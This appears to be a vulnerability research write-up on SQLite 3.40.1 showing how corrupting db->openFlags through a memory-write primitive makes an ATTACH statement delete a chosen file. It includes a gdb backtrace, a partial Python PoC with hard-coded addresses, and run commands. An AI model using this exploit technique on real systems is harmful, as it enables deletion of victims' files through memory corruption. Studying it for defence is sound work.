# isDelete

## Program

[SQLite 3.40.1](https://github.com/sqlite/)

## Description

In SQLite, the `ATTACH` command is used to attach a database file to current database connection. The syntax is `attach path/to/db_file as xxx`

SQLite will call `attachFunc` to handle the statement and will finally call `unixOpen` to open the db file.
```
#0  unixOpen (pVfs=0x6495c0 <sqlite3_os_init.aVfs>, 
    zPath=0x6960cc "/home/hfy5130/sqlite_versions/sqlite/hello", pFile=0x695f40, flags=0x106, 
    pOutFlags=0x7fffffffad14) at sqlite3.c:42758
#1  0x0000000000476225 in sqlite3OsOpen (pVfs=0x6495c0 <sqlite3_os_init.aVfs>, 
    zPath=0x6960cc "/home/hfy5130/sqlite_versions/sqlite/hello", pFile=0x695f40, flags=0x106, 
    pFlagsOut=0x7fffffffad14) at sqlite3.c:24987
#2  0x0000000000475018 in sqlite3PagerOpen (pVfs=0x6495c0 <sqlite3_os_init.aVfs>, ppPager=0x695910, 
    zFilename=0x695894 "hello", nExtra=0x88, flags=0x0, vfsFlags=0x106, xReinit=0x475600 <pageReinit>)
    at sqlite3.c:60080
#3  0x000000000047425f in sqlite3BtreeOpen (pVfs=0x6495c0 <sqlite3_os_init.aVfs>, 
    zFilename=0x695894 "hello", db=0x6862e0, ppBtree=0x693b28, flags=0x0, vfsFlags=0x106) at sqlite3.c:70718
#4  0x0000000000578c9c in attachFunc (context=0x6938e0, NotUsed=0x3, argv=0x693910) at sqlite3.c:116024
```

In `unixOpen`, `isDelete` is calculated from `flag` and used to determine whether to delete the attached db file.
```c
int isDelete     = (flags & SQLITE_OPEN_DELETEONCLOSE);
  if( isDelete ){
    '''
    osUnlink(zName);
  }
```

In order to set `isDelete` to true, we need to set `flag` to proper value. We notice that the last time the value of `flag` changed is `flags = db->openFlags` in `attachFunc`. We also found that `db->openFlags` is a variable used by all databases. Therefore, we can corrupt `db->openFlags` before executing `attach hello as h`. Then, the `attach` statement set `isDelete` to true based on forged `db->openFlags` and delete target file.

Note: 
1. There are some `assert` checks, which are hard to bypass. However, in released version, these `assert` are disabled.
2. `create` statement will also initialize a `db->openFlags`.

## Attack in the wild

### Gain arbitrary memory-write primitive

We reuse the [bug](../SQLite-doXdgOpen/analysis.md/#gain-arbitrary-memory-write-primitive).

### PoC

We need t exploit the vulnerability to corrupt `db->openFlags`. We disabled ASLR in this attack, so the address of p and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [poc.py](./poc.py).

```py
# The address of openFlags
openFlags = 0x651a6c
# set zMalloc in sqlite3_value
exp = writeVal(exp, sqlite3_value_off + 0x40, openFlags, 8)
# set the value of openFlags
exp = writeVal(exp, src_off, 0x100e, 4)
```

```
// exploit
rm -rf ~/.sqlite*
./isDelete-exp.py
gdb ./sqlite3
    r < /tmp/exp
```
